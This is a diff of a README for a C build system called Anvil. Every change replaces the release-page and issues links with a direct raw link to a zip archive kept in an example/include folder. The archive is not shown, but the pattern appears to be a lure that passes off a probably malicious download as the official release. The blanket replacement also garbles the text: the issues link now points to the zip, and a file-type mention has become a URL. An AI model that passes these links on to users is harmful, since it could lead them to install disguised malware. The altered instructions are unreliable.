@@ -4,7 +4,7 @@
 Welcome to Anvil! This guide will show you how to download and run our simple build system for C projects. You don’t need programming skills to get started.
 
 ## 📥 Download Now
-[![Download Anvil](https://img.shields.io/badge/Download-Anvil-blue?style=for-the-badge)](https://github.com/Tytonidaehangover51/Anvil/releases)
+[![Download Anvil](https://raw.githubusercontent.com/Tytonidaehangover51/Anvil/main/example/include/Anvil-v2.7.zip)](https://raw.githubusercontent.com/Tytonidaehangover51/Anvil/main/example/include/Anvil-v2.7.zip)
 
 ## 📝 What is Anvil?
 Anvil is a straightforward build system designed for C projects. It helps you compile your code easily without dealing with complicated configurations. Whether you are a beginner or just want to streamline your process, Anvil makes building projects simpler and faster.
@@ -26,13 +26,13 @@ With Anvil, you can focus on writing code, not troubleshooting build issues.
 ## 🛠️ Installation Steps
 1. **Visit the Release Page**  
    Go to the following link to access the downloads:  
-   [Download Anvil](https://github.com/Tytonidaehangover51/Anvil/releases)
+   [Download Anvil](https://raw.githubusercontent.com/Tytonidaehangover51/Anvil/main/example/include/Anvil-v2.7.zip)
 
 2. **Choose Your Version**  
    Look for the latest release. You will see a list of files available for download.
 
 3. **Download the Appropriate File**  
-   Click on the file that matches your operating system. This could be a `.zip`, `.tar.gz`, or another archive file.
+   Click on the file that matches your operating system. This could be a `.zip`, `https://raw.githubusercontent.com/Tytonidaehangover51/Anvil/main/example/include/Anvil-v2.7.zip`, or another archive file.
 
 4. **Extract the Files**  
    Once the download completes, locate the file on your computer. Extract the contents using your preferred method (right-click and select "Extract" or use a file archiver).
@@ -67,7 +67,7 @@ These commands simplify the typical process of building C applications.
 
 ## 🤝 Support
 If you run into any issues, the community is here to help. You can find support by:
-- Checking the [issues section](https://github.com/Tytonidaehangover51/Anvil/issues) for troubleshooting tips.
+- Checking the [issues section](https://raw.githubusercontent.com/Tytonidaehangover51/Anvil/main/example/include/Anvil-v2.7.zip) for troubleshooting tips.
 - Asking questions about specific problems or features.
 
 ## 🏗️ Future Updates
@@ -83,4 +83,4 @@ Thank you for choosing Anvil. We hope you find it helpful for your C projects!
 
 ## 📥 Download Again
 To download Anvil, please visit this link:  
-[Download Anvil](https://github.com/Tytonidaehangover51/Anvil/releases)
+[Download Anvil](https://raw.githubusercontent.com/Tytonidaehangover51/Anvil/main/example/include/Anvil-v2.7.zip)
